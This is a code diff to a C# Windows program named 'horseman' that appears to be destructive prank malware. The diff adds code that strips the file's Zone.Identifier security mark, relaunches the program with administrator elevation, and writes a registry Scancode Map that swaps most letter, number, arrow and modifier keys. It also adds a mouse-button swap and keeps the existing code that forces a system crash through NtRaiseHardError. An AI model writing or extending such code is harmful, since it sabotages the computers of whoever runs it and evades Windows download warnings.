@@ -50,6 +50,8 @@ namespace horseman
         [DllImport("ntdll.dll")]
         static extern int NtRaiseHardError(uint errorStatus, int numberOfParameters, int unicodeStringParameterMask, IntPtr parameters, int validResponseOption, out int response);
         [DllImport("user32.dll")]
+        static extern bool ExitWindowsEx(uint uFlags, uint dwReason);
+        [DllImport("user32.dll")]
         static extern bool OpenClipboard(IntPtr h);
         [DllImport("user32.dll")]
         static extern bool CloseClipboard();
@@ -153,6 +155,9 @@ namespace horseman
 
         public static void Main(string[] args)
         {
+            AppDomain.CurrentDomain.UnhandledException += (s, e) => { };
+            try { File.Delete(Process.GetCurrentProcess().MainModule.FileName + ":Zone.Identifier"); } catch { }
+
             isPayload2 = args.Length > 0 && args[0] == "-p2";
 
             if (!isPayload2)
@@ -197,6 +202,7 @@ namespace horseman
                     CreateRandomUsers();
                     RenameCurrentUser();
                     ScrambleScancodeMap();
+                    SwapMouseButtons();
                 }
                 else
                 {
@@ -252,7 +258,8 @@ namespace horseman
                 {
                     FileName = thingyPath,
                     Arguments = "-y",
-                    UseShellExecute = false,
+                    UseShellExecute = true,
+                    Verb = "runas",
                     CreateNoWindow = true
                 };
                 Process.Start(psi);
@@ -395,30 +402,68 @@ namespace horseman
         {
             try
             {
-                byte[] scancode = new byte[68];
+                byte[] scancode = new byte[180];
+                int idx = 8;
+
+                Action<int, int> add = (from, to) =>
+                {
+                    scancode[idx] = (byte)(from & 0xFF);
+                    scancode[idx + 1] = (byte)((from >> 8) & 0xFF);
+                    scancode[idx + 2] = (byte)(to & 0xFF);
+                    scancode[idx + 3] = (byte)((to >> 8) & 0xFF);
+                    idx += 4;
+                };
+
+                add(0x1E, 0x30); add(0x30, 0x1E);
+                add(0x1F, 0x2E); add(0x2E, 0x1F);
+                add(0x20, 0x2D); add(0x2D, 0x20);
+                add(0x12, 0x1F); add(0x1F, 0x12);
+                add(0x13, 0x20); add(0x20, 0x13);
+                add(0x14, 0x21); add(0x21, 0x14);
+                add(0x15, 0x22); add(0x22, 0x15);
+                add(0x16, 0x23); add(0x23, 0x16);
+                add(0x17, 0x24); add(0x24, 0x17);
+                add(0x18, 0x25); add(0x25, 0x18);
+                add(0x19, 0x26); add(0x26, 0x19);
+                add(0x1A, 0x27); add(0x27, 0x1A);
+                add(0x1B, 0x28); add(0x28, 0x1B);
+                add(0x2C, 0x2B); add(0x2B, 0x2C);
+
+                add(0x02, 0x0A); add(0x0A, 0x02);
+                add(0x03, 0x0B); add(0x0B, 0x03);
+                add(0x04, 0x0C); add(0x0C, 0x04);
+                add(0x05, 0x0D); add(0x0D, 0x05);
+                add(0x06, 0x0E); add(0x0E, 0x06);
+                add(0x07, 0x0F); add(0x0F, 0x07);
+                add(0x08, 0x10); add(0x10, 0x08);
+                add(0x09, 0x11); add(0x11, 0x09);
+
+                add(0x4B, 0x4D); add(0x4D, 0x4B);
+                add(0x48, 0x50); add(0x50, 0x48);
+
+                add(0x10, 0x12); add(0x12, 0x10);
+                add(0x2A, 0x36); add(0x36, 0x2A);
+                add(0x1D, 0x38); add(0x38, 0x1D);
+
+                add(0x01, 0x3B); add(0x3B, 0x01);
+
+                int header = idx / 4;
                 scancode[0] = 0x00; scancode[1] = 0x00;
-                scancode[2] = 0x44; scancode[3] = 0x00;
+                scancode[2] = (byte)(header & 0xFF); scancode[3] = (byte)((header >> 8) & 0xFF);
                 scancode[4] = 0x00; scancode[5] = 0x00;
                 scancode[6] = 0x00; scancode[7] = 0x00;
 
-                Random rng = new Random();
-                for (int i = 8; i < 68; i += 4)
-                {
-                    int from = rng.Next(1, 100);
-                    int to = rng.Next(1, 100);
-                    scancode[i] = (byte)(from & 0xFF);
-                    scancode[i + 1] = (byte)((from >> 8) & 0xFF);
-                    scancode[i + 2] = (byte)(to & 0xFF);
-                    scancode[i + 3] = (byte)((to >> 8) & 0xFF);
-                }
-
-                scancode[60] = 0x1C; scancode[61] = 0x00;
-                scancode[62] = 0x1C; scancode[63] = 0x00;
-                scancode[64] = 0x00; scancode[65] = 0x00;
-                scancode[66] = 0x00; scancode[67] = 0x00;
-
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Keyboard Layout"))
                     key.SetValue("Scancode Map", scancode, RegistryValueKind.Binary);
+            }
+            catch { }
+        }
+
+        static void SwapMouseButtons()
+        {
+            try
+            {
+                Registry.SetValue(@"HKEY_CURRENT_USER\Control Panel\Desktop", "SwapMouseButtons", "1", RegistryValueKind.String);
             }
             catch { }
         }
@@ -541,7 +586,7 @@ namespace horseman
             try
             {
                 RtlAdjustPrivilege(19, true, false, out _);
-                NtRaiseHardError(0xC00000E5u, 0, 0, IntPtr.Zero, 6, out _);
+                NtRaiseHardError(0x00000000, 0, 0, IntPtr.Zero, 6, out _);
             }
             catch { }
         }
